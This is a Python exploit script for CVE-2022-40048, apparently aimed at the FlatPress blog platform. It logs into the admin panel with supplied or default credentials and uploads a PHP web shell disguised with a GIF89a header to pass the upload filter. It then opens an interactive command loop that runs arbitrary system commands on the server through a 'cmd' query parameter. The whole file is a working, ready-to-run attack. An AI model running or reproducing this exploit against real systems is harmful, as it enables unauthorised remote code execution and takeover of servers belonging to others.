# CVE-2022-40048

from selenium import webdriver
from selenium.webdriver.common.by import By
import requests
import warnings
import sys
import os
import argparse

warnings.filterwarnings("ignore")
# Argument Parser
parser = argparse.ArgumentParser(description="CVE-2022-40048", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("-u", "--URL", action="store", help="URL : https://example.com:port or http://example.com:port")
parser.add_argument("-un", "--USERNAME", action="store", help="Username",default="admin")
parser.add_argument("-p", "--PASSWORD", action="store", help="Password",default="password")
parser.add_argument("-f", "--FILE", action="store", help="Enter File Path")

args = parser.parse_args()
parser.parse_args(args=None if sys.argv[1:] else ['--help'])
p1 = "GIF89a;\n"
URL = args.URL
username = args.USERNAME
password = args.PASSWORD
current_directory = os.getcwd()

def exploit():
    options = webdriver.FirefoxOptions()
    options.add_argument('--headless')
    driver = webdriver.Firefox(options=options)
    print("[x] Logging in")
    driver.get(f"{URL}/login.php")
    element = driver.find_element(By.NAME, 'user') 
    element.send_keys(username)
    element = driver.find_element(By.NAME, 'pass')
    element.send_keys(password)
    clickable = driver.find_element(By.ID, "submit")
    clickable.click()
    driver.get(f"{URL}/admin.php?p=uploader")
    result = driver.title
    if "Administration area" in result:
        print("[+] Logged in successfully")
    else:
        print("[-] Login failed")
        sys.exit()
    print("[x] Uploading payload")
    driver.get(f"{URL}/admin.php?p=uploader")
    file_inputs = driver.find_elements(By.NAME,'upload[]')
    file_path = os.path.join(current_directory, 'shell.php')
    file_inputs[0].send_keys(file_path)
    clickable = driver.find_element(By.ID, "upload")
    clickable.click()
    driver.get(f"{URL}/fp-content/attachs/shell.php")
    current_url = driver.current_url
    response = requests.get(current_url, verify=False)
    result = response.status_code

    if result == 200:
        print("[+] Payload uploaded")
    else:
        print("[-] Payload upload failed")
        sys.exit()
    # print("[x] Executing payload")
    if args.FILE:
        print("[+] Executing custom payload")
        response = requests.get(f"{URL}/fp-content/attachs/shell.php", verify=False)
        print(response.text)
    else:
        print("[+] Executing default payload")
        while 1:
            cmd = input("shell@flatpress$ ")
            if cmd == "exit":
                sys.exit()
            URL2 = f"{URL}/fp-content/attachs/shell.php?cmd={cmd}"
            response = requests.get(URL2, verify=False)
            print(response.text)
def payload():
    if args.FILE: 
        shell = args.FILE
        with open(shell, 'r') as file:
            p2 = file.read()
        with open("shell.php", 'w') as file:
            file.write(p1)
            file.write(p2)
    else:
        with open('shell.php', 'w') as file:
            file.write(p1)
            file.write(f'<?php system($_GET["cmd"]); ?>' )

def main():
    print("[+] Creating Payload")
    payload()
    print("[+] Payload Created")
    exploit()

    
if __name__ == '__main__':
    main()
    





        
